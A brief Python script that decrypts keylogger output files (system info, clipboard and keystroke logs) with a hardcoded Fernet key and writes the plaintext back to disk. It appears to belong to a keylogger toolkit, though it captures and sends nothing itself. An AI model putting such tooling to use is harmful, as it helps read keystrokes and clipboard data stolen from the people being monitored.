from cryptography.fernet import Fernet

key = "T6SKgZgknBO5v2JOn2MxKz8GChIUfwCvHq6zebRy8Lk="

system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"
keys_information_e = "e_keys_log.txt"

encrypted_files = [system_information_e, clipboard_information_e, keys_information_e]
count = 0

for decrypting_file in encrypted_files:
    with open(encrypted_files[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    dencrypted = fernet.decrypt(data)

    with open(encrypted_files[count], "wb") as f:
        f.write(dencrypted)
    
    count += 1